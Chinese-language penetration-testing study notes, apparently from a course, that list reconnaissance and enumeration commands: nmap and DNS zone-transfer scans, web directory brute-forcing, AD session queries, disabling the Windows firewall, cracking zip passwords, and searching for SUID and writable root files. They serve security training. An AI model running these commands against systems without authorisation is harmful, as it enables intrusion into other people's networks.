  - 查询DC的活动会话
    ```
    Get-NetSession -Computer DC_Name
    ```


### AD身份认证



  关闭防火墙
  netsh advfirewall set allprofiles state off
  netsh advfirewall show allprofiles
  


## 渗透测试技能整合
### 1. 公网扫描
 - 扫描端口
### 2. web渗透
 - 手动浏览主页
 - web应用枚举
---
## 7/20/2022 Lesson
### 侦查
```
寻找内网DNS服务器
sudo nmap -p53 -sU xxx.xxx.xxx.xxx/24 --open --reason | grep "xxx.xxx.xxx." |awk '{print $5}' >> dns.txt
// 针对udp 53端口

解析域名
for ip in $(cat "dns.txt");do host xxx.xxx.xxx.xxx $ip; done | grep -v "not found"
for ip in $(cat dns-servers); do nslookup xxx.xxx.xxx.xxx $ip; done

区域传输
dnsrecon -d xxx.com -n ip -t axfr
```
### 快速扫描
```
nmap xxx.xxx.xxx.xxx --top-ports 10 --open
```
### 全端口扫描
```
sudo nmap -p1-1000 ip

nmap ip -p- -sV --reason --dns-server ip

sudo nmap -p1-1000 ip

sudo -pports -sV ip
```
### udp扫描
```
sudo nmap -p- -sU ip
```
### 扫描服务
```
nc -nv ip port
```
### ssh脚本扫描
```
nmap ip -p 22 -sV --script=ssh-hostkey
```
### WEB服务/应用
```
获取信息
curl -i -L ip
gobuster -u http://url/ -w wordlists -s 'status codes' -e
// 类似的:dirb dirbuster gobuster dirsearch
```
### 搜索漏洞
```
searchsploit
```
### 寻找可以修改的文件
```
find / type f -user root -perm -o=w 2>/dev/null
```
### rbash绕过
- 编程语言
- 系统的/bin/sh
- bash -i

### 压缩包密码爆破
```
fcrackzip -u -D -p wordlists file
```
### ssh私钥登陆
```
ssh -i file username@ip
```
### 查找有suid权限的文件
```
find / -perm -4000 -type f 2>/dev/null
```

